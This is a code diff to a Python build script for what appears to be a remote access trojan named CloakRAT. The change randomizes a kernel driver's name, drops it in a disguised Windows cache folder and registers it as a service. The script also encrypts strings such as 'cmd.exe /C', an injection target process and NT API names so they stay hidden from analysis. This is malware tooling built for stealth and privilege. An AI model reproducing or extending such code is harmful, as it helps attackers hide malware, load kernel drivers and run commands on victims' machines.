@@ -9,8 +9,9 @@ KEY_ENTROPY = 16  # bytes
 HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
 HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
-def get_random_driver_name(length: int) -> str:
-    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+# Randomize the driver name
+KPH_DRIVER_NAME = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8)) 
+KPH_DRIVER_PATH_ON_DISK = f'C:\\ProgramData\\Microsoft\\Windows\\Caches\\{KPH_DRIVER_NAME}.sys'
 
 # Add or modify strings here.
 strings_to_encrypt = {
@@ -19,7 +20,11 @@ strings_to_encrypt = {
     'str_cmd': 'cmd.exe /C',
     'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',  # USED BY OLD INJECTOR
     'str_procName': 'notepad.exe', # USED BY OLD INJECTOR
-    'str_kphDriverPathOnDisk': f'C:\\Windows\\System32\\drivers\\{get_random_driver_name(8)}.sys',
+    'str_kphDriverPathOnDisk': KPH_DRIVER_PATH_ON_DISK,
+    'str_kphDriverNtPath': '\\??\\' + KPH_DRIVER_PATH_ON_DISK,
+    'str_servicesPath': f'SYSTEM\\CurrentControlSet\\Services\\{KPH_DRIVER_NAME}',
+    'str_ImagePath': 'ImagePath',
+    'str_Type': 'Type',
     
     # Function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
